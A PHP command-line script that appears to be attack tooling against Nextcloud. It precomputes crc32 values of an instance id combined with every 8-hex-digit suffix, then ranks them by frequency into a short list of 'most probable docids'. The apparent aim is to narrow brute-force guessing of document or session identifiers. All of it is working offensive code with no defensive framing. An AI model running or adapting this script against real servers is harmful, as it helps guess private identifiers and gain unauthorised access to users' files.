<?php
  /**
    crc32( instanceid + 8 hex chars )
  */

  if( empty( $argv[1] ) ){
    echo "Pass the instance id of Nextcloud as the first argument\n";
    echo "(this is the *name* of the cookie that holds your session token)\n";
    exit;
  }
  $instanceid = $argv[1];
  /*
  $instanceid = 'oc9gn4ob06oo';
  $instanceid = 'aaaaaaaaaaaa';
  */
  $hex = str_split('0123456789abcdef' );
  $str = "";
  $count = 0;
  $total = 4294967296; 
  echo "Generating CRCs (this will take around 43GB of HD space)\n";
  foreach( $hex as $a ){
    foreach( $hex as $b ){
      foreach( $hex as $c ){
        foreach( $hex as $d ){
          foreach( $hex as $e ){
            foreach( $hex as $f ){
              foreach( $hex as $g ){
                foreach( $hex as $h ){
                  $key = $instanceid . $a . $b . $c .$d . $e .$f .$g .$h;
                  $crc = crc32( $key );
                  $str .= $crc."\n";
                  $count++;
                }
              }
            }
          }
        }
        file_put_contents( "crcs", $str, FILE_APPEND );
        $str = "";
        echo "$count / $total (".round($count*100/$total)."%)\r";
      }
    }
  }
  echo "Finished generating CRCs. Creating frequency list (this will take *hours* and around 50GB of HD space)...\n";
  system("sort crcs | uniq -c | sort -rn > crcs_freq");

  echo "Taking the top 0.2% of CRCs, which should account for around 1% of address space\n";
  system("head -n ".round($total*0.002)." crcs_freq | cut -c 9- > probablecrcs");
  echo "Done. probablcrcs contains the most probable docids. You can delete crcs and crcs_freq now unless you're interested in analysing them further.\n";
?>
